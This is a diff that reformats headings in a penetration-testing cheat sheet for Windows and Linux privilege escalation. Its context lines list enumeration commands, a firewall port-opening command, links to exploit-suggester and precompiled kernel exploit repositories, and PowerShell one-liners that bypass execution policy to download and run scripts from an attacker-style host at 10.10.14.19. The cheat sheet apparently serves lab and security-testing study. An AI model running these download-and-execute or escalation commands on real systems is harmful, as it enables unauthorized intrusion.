@@ -487,8 +487,8 @@ https://github.com/GDSSecurity/Windows-Exploit-Suggester
 Linux
 https://github.com/sleventyeleven/linuxprivchecker/
 
-Priv-Esc (Windows) Check-List
-● Basic System Information
+# Priv-Esc (Windows) Check-List
+#### Basic System Information
 ○ systeminfo
 ○ whoami; echo %username; hostname
 ○ net user
@@ -509,7 +509,9 @@ Priv-Esc (Windows) Check-List
 ○ netsh firewall show state
 ○ netsh firewall show config
 ○ netsh firewall add portopening TCP 80 "Open Port 80"
-● Services
+
+
+#### Services
 https://toshellandback.com/2015/11/24/ms-priv-esc/
 ● Services we can modify binpath
 ○ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
@@ -552,21 +554,24 @@ permissions for specific user)
 ■ C:\Windows\Panther\Unattend\
 ■ C:\Windows\System32\
 ■ C:\Windows\System32\sysprep\
-● Accesschk - file permissions
+#### Accesschk - file permissions
 
 ○ accesschk.exe -uwdqs Users c:
 ○ accesschk.exe -uwdqs "Authenticated Users" c:\ (weak folder permissions)
 ○ accesschk.exe -uwqs Users c:*.*
 ○ accesschk.exe -uwqs "Authenticated Users" c:*.* (weak file permissions)
-● Scripts
+
+#### Scripts
 ○ https://github.com/pentestmonkey/windows-privesc-check
 ○ https://github.com/GDSSecurity/Windows-Exploit-Suggester
 ○ https://github.com/M4ximuss/Powerless
 ○ https://github.com/rasta-mouse/Sherlock
-● Precompiled exploits
+#### Precompiled exploits
+
 ○ https://github.com/SecWiki/windows-kernel-exploits/
 ○ https://github.com/abatchy17/WindowsExploits
-● Powershell
+
+#### Powershell
 ○ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
 -NoProfile -File file.ps1
 ○ powershell.exe -nop -exec bypass -c "IEX (New-Object
@@ -576,7 +581,7 @@ Net.WebClient).DownloadString('http://10.10.14.19:8080/PowerUp.ps1'
 Net.WebClient).DownloadString('http://10.10.14.19:8080/Sherlock.ps1
 ')" | powershell -noprofile -
 
-Priv-Esc (Linux) Check-List
+# Priv-Esc (Linux) Check-List
 ● OS – Version and Architecture
 ○ uname –a
 ○ cat /etc/*-release
@@ -621,7 +626,7 @@ gcc -o suid suid.c
 ○ https://github.com/pentestmonkey/unix-privesc-check
 ○ https://github.com/rebootuser/LinEnum
 
-Tips and Tricks
+# Tips and Tricks
 
 Windows Searching:
 ● Dir C:\Windows /S *cmd*
